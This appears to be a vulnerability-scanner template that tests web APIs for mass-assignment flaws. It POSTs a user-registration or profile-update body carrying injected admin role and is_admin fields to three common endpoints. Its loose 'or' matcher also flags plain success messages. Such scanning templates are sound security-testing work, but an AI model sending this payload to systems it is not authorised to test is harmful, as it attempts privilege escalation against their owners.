id: K70n0s510-mass-assignment
info:
  name: JSON Mass Assignment (Role Promotion)
  author: K70n0s510
  severity: high
  description: Attempts to elevate privileges by injecting 'role' or 'admin' parameters.
  tags: a04,logic,api
http:
  - method: POST
    path:
      - "{{BaseURL}}/api/users"
      - "{{BaseURL}}/api/register"
      - "{{BaseURL}}/api/profile/update"
    headers:
      Content-Type: application/json
    body: '{"username":"test_user","email":"test@example.com","role":"admin","is_admin":true,"isAdmin":true,"group":"admin"}'
    matchers-condition: or
    matchers:
      - type: word
        words: ["\"role\":\"admin\"", "\"is_admin\":true"]
      - type: word
        words: ["created", "updated", "success"]
